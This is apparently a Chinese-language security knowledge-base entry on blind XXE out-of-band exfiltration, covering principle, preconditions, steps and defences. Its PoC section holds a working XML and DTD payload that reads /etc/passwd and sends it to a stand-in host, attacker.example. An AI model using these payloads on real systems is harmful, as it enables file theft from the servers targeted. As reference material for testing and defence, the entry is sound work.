---
id: web-generic-xxe-oob-exfil
title: 盲 XXE 的 OOB 外带
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-oob
tags:
- web
- xxe
- oob
- exfiltration
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-04'
updated: '2026-11-04'
url: /docs/web/generic/xxe/oob-exfil/
draft: false
kb_aliases:
- blind XXE
- OOB XXE
- 盲 XXE
---

## 一句话结论

当 XXE 无回显时，用外部 DTD 把文件内容拼进请求 URL 或错误信息，通过攻击者控制的服务器外带数据。

## 原理

XML 解析器支持外部实体。即使响应不回显实体内容，也可以通过参数实体把本地文件内容作为 URL 的一部分发起请求，攻击者从 DNS/HTTP 日志中读取。或利用错误信息把内容带出。

## 触发条件

- 目标解析用户可控 XML；
- 允许外部实体/外部 DTD；
- 目标可出网（或可通过 DNS 外带）。

## 利用步骤

1. 确认 XML 入口与是否解析外部实体；
2. 在攻击者服务器放置恶意 DTD；
3. 提交引用该 DTD 的 XML；
4. 从 HTTP/DNS 日志读取外带内容。

## PoC

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.example/evil.dtd">
  %remote;
]>
<root>&xxe;</root>
```

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?d=%file;'>">
%eval;
%exfil;
```

## 变体与关联

- 变体：错误信息外带、FTP 外带、DNS 外带；
- 关联：SSRF、文件读取。

## 检测与防御

- 检测：XML 中的 `DOCTYPE`/`ENTITY`、异常出站请求；
- 防御：禁用外部实体与 DTD、使用安全解析配置。
